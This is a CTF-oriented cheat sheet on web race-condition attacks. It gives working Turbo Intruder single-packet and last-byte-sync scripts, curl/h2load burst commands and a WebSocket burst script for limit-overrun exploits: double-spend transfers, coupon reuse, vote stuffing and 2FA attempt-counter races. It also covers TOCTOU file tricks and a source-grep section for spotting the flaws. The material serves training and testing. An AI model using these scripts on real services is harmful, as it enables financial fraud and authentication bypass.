# CTF Web - Race Conditions & Single-Packet Attack

Precise-timing race exploitation for CWEE-style challenges: the HTTP/2 single-packet attack, HTTP/1 last-byte sync, limit-overrun (double-spend / coupon reuse), multi-endpoint and multi-step business-logic races, and TOCTOU. For the conceptual/basic TOCTOU note and simple `asyncio` sprayer see [server-side-deser.md](server-side-deser.md); for finding non-atomic patterns in source see [whitebox-review.md](whitebox-review.md).

## Table of Contents
- [When to Suspect a Race](#when-to-suspect-a-race)
- [Why Naive Concurrency Fails](#why-naive-concurrency-fails)
- [Single-Packet Attack (HTTP/2)](#single-packet-attack-http2)
- [Turbo Intruder: Single-Packet Template](#turbo-intruder-single-packet-template)
- [Turbo Intruder: HTTP/1 Last-Byte Sync](#turbo-intruder-http1-last-byte-sync)
- [Limit-Overrun Targets](#limit-overrun-targets)
- [Multi-Endpoint / Multi-Step Races](#multi-endpoint--multi-step-races)
- [TOCTOU: Filesystem and Session](#toctou-filesystem-and-session)
- [Connection Warming and Sync Tips](#connection-warming-and-sync-tips)
- [Command-Line Alternatives](#command-line-alternatives)
- [Detecting Races in Source](#detecting-races-in-source)

---

## When to Suspect a Race

Any flow where a **check and an action are not atomic**, and a per-user cap or single-use resource exists:
- balance/credit checked then debited; purchase/withdraw/transfer
- single-use coupon, gift card, voucher, invite, or 2FA/OTP verification counter
- "one vote / one like / one claim per user"
- registration/username uniqueness, or email-change confirmation
- file upload validate-then-move/scan, or "apply once" state transitions
- rate limits and anti-brute-force counters

In whitebox, the tell is `SELECT ... then UPDATE` without `FOR UPDATE`/serializable, `if exists` then `create`, `get` then `set` on Redis without `WATCH/MULTI`, or `if balance >= x: balance -= x` outside a transaction.

---

## Why Naive Concurrency Fails

Firing N requests with threads / `asyncio` / `xargs -P` spreads arrival across many milliseconds due to TCP handshake jitter, TLS, and kernel scheduling. The server may fully process request 1 (and commit the state change) before request 20 arrives — no overlap, no race. To hit a microsecond-wide window you must make all requests *arrive and start processing simultaneously*. That is what the single-packet attack achieves.

---

## Single-Packet Attack (HTTP/2)

James Kettle's technique: exploit HTTP/2 multiplexing to place **20-30 complete requests in a single TCP packet**, so the server receives them together and dispatches them concurrently — eliminating network jitter as a variable. Works on any HTTP/2 endpoint; ~1ms spread instead of ~100ms.

Mechanics: send every request's headers and body *except the final frame/byte*, wait for all streams to be buffered, then release the last piece of every request at once (a single TCP segment). Burp's Turbo Intruder and Repeater ("Send group in parallel → single-packet") implement this. Prefer it whenever the target speaks h2.

---

## Turbo Intruder: Single-Packet Template

Burp → extension → Turbo Intruder → paste the request, load this script. `Engine.BURP2` auto-selects the single-packet attack for HTTP/2 and last-byte sync for HTTP/1.

```python
# race_singlepacket.py
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,        # single connection = single packet
        engine=Engine.BURP2,
    )
    # Queue N identical requests behind one gate; nothing sends yet.
    for i in range(30):
        engine.queue(target.req, gate='race1')
    # Release the withheld final bytes of all 30 at once.
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)                       # inspect status/length/body for the winner(s)
```

Read `table` for anomalies: multiple `200`s where only one should succeed, a balance that went negative, two accounts created with the same name. The request in Turbo Intruder must be the real target request (right cookies/CSRF token). If the app requires a fresh CSRF token per request, fetch it out-of-band or target an endpoint that reuses one.

---

## Turbo Intruder: HTTP/1 Last-Byte Sync

If the target is HTTP/1 only, `Engine.BURP2` (or `Engine.THREADED` with a gate) uses last-byte synchronization: send all bytes except the final one on each of N connections, then release the last byte on all connections together.

```python
# race_http1_lastbyte.py
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,        # one conn per request for HTTP/1
        engine=Engine.THREADED,
        pipeline=False,
    )
    for i in range(30):
        engine.queue(target.req, gate='g1')
    engine.openGate('g1')

def handleResponse(req, interesting):
    table.add(req)
```
Warm the connections first (see [tips](#connection-warming-and-sync-tips)); HTTP/1 sync is looser than single-packet, so use 20-50 requests and repeat.

---

## Limit-Overrun Targets

All follow the same shape: a per-user cap enforced by non-atomic read-check-write. Send the *same* request 20-40x via the single-packet template.

- **Double-spend / negative balance.** `POST /api/transfer {"to":"attacker","amount":<=balance}`. All copies read the pre-debit balance → total transferred exceeds balance. Same for "buy item costing all credits" claimed many times.
- **Single-use coupon / gift card.** `POST /redeem {"code":"ONCE"}` — many copies validate the code before any marks it used → credit applied N times.
- **Vote / like / claim once.** `POST /vote {"id":X}` × N → counter jumps by N; useful to cross a threshold that unlocks the flag.
- **OTP / 2FA brute window.** If a code is checked and an attempt counter incremented non-atomically, race many guesses against a low-entropy code before the counter locks (see also affine/TOTP weaknesses in [auth-and-access.md](auth-and-access.md)).
- **Gift/referral self-credit.** Apply a referral or "first order discount" concurrently to stack it.

Confirm by reading state after: balance, redemption count, or the flag gate.

---

## Multi-Endpoint / Multi-Step Races

Business-logic races that need *different* requests fired in the same window (e.g. "confirm email change" while "change email again", or "add to cart at price A" while "price updates to B"). Queue distinct requests to one gate:

```python
# race_multistep.py  — fire two different requests simultaneously
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1, engine=Engine.BURP2)

    reqA = '''POST /api/cart/add HTTP/2
Host: TARGET
Cookie: session=SID
Content-Type: application/json
Content-Length: 24

{"item":"gold","qty":1}'''

    reqB = '''POST /api/checkout HTTP/2
Host: TARGET
Cookie: session=SID
Content-Length: 0

'''
    # Interleave several of each behind the same gate
    for i in range(10):
        engine.queue(reqA, gate='m1')
        engine.queue(reqB, gate='m1')
    engine.openGate('m1')

def handleResponse(req, interesting):
    table.add(req)
```
State-machine races to try: apply-coupon vs finalize-order; use-item vs sell-item (dupe); withdraw vs cancel-withdraw; promote-to-admin vs permission-check. The goal is to land a step against a *stale* view of state set by the other step.

---

## TOCTOU: Filesystem and Session

- **Upload validate-then-move/scan.** Server writes the file, validates (magic bytes / AV), then moves or deletes on failure. Race a request that *executes/reads* the file in the gap between write and delete. Loop-fetch the predictable upload URL while re-uploading (pair a single-packet upload burst with a fetch burst).
- **Symlink swap.** If the app checks a path then opens it, swap a benign file for a symlink to `/flag` between check and open (classic `if os.path.exists()`/`realpath` then `open`).
- **Session/counter file.** Two requests read the same session/quota file, both decrement, both write — quota underflow. Same for file-based "used" markers.
- **Temp-file predictable name** (`uniqid`, PID, timestamp) plus TOCTOU → pre-create or hijack (see [server-side-2.md](server-side-2.md) `uniqid()`).

---

## Connection Warming and Sync Tips

- **Warm the connection(s)** with one throwaway request before the gated burst so TLS/TCP setup and server-side caches/JIT are already done — otherwise the first request lags.
- **Keep the packet small.** Fewer/smaller headers = the 20-30 requests fit in one TCP segment. Strip needless headers in the Turbo Intruder request.
- **Right count.** Single-packet: 20-30 is plenty. HTTP/1 last-byte: 30-50 and repeat several times.
- **Disable auto-updating tokens.** Per-request CSRF/nonce breaks identical replay; either reuse a token the server doesn't rotate or fetch tokens first.
- **Re-run.** Races are probabilistic; fire the group 3-10 times and diff results before concluding it is not vulnerable.
- **Repeater alternative.** For a quick manual test, put requests in a Burp tab group and use "Send group in parallel" (single-packet) — good for 2-request logic races.

---

## Command-Line Alternatives

No Burp available. `asyncio` (in [server-side-deser.md](server-side-deser.md)) works for wide windows. For tighter timing without Turbo Intruder:

```bash
# h2load / nghttp for HTTP/2 concurrency (approximate; not true single-packet)
h2load -n 30 -c 1 -m 30 -H "Cookie: session=SID" \
  -d body.json 'https://TARGET/api/redeem'

# curl parallel burst (HTTP/1, loose timing) — repeat many times
seq 40 | xargs -P40 -I{} curl -sk -X POST https://TARGET/api/redeem \
  -H 'Cookie: session=SID' -d 'code=ONCE' -o /dev/null -w '%{http_code}\n' | sort | uniq -c
```
For real single-packet from Python, use the `h2` library to buffer all streams and flush the final `DATA` frames together, or just script Turbo Intruder — the extension is the pragmatic choice.

---

## Detecting Races in Source

Grep the boundary between a check and a state change (see [whitebox-review.md](whitebox-review.md) for the wider methodology):
```bash
grep -RniE 'balance|credit|coupon|redeem|used|count|quota|stock|limit|vote' "$SRC"
# then inspect each for: SELECT/get ... UPDATE/set with no transaction/lock
grep -RniE 'FOR UPDATE|SELECT .* LOCK|BEGIN|transaction|SERIALIZABLE|WATCH|MULTI|LOCK TABLES|with_for_update|select_for_update' "$SRC"
```
Red flags: `if row.balance >= amount:` then a separate `UPDATE`; `if not User.exists(name):` then `create`; Redis `GET k` then `SET k`; `os.path.exists`/`realpath` then `open`; any per-user counter incremented after the check it guards. Absence of the second grep's constructs around a hit in the first = likely raceable.

## WebSocket burst race — pipeline every frame before reading any reply

**Trigger:** A WebSocket app whose replies carry a field the client-side `message` handler never reads (a counter, `spawnId`, a sequence number), and where a UI button is the only sanctioned way to send.

This pack's race material is all HTTP (single-packet attack, HTTP/1 last-byte sync); the WebSocket equivalent is simply to decouple sends from receives on one already-open connection. A browser-driven loop pays a full round trip plus a microtask drain plus DOM and media work between frames, so its received-side cadence is far slower than the server's window; a script that pushes all N frames and only then drains N replies arrives inside it. Sweep N upward from 1 and diff whole reply objects rather than just the fields the page renders — the winning reply typically carries extra keys the client silently discards. Warm the connection with one throwaway frame first so the handshake is not part of the burst. If a `send -> recv -> sleep(0)` loop fails but the same count sent pipelined succeeds, the server is counting arrivals per unit time and the UI cadence was the only throttle.

```python
import asyncio, json, websockets
async def burst(url, n):
    async with websockets.connect(url) as ws:
        await ws.send(json.dumps({"type": "spawn"}))   # warm
        await ws.recv()
        for _ in range(n):                              # send everything first
            await ws.send(json.dumps({"type": "spawn"}))
        return [await ws.recv() for _ in range(n)]      # only then read
for n in range(1, 21):
    print(n, [r for r in asyncio.run(burst(URL, n)) if "flag" in r or "won" in r])
```

Source: https://cybersecurityelite.com/ctf-writeups/lyknctf-2026-web-writeup/
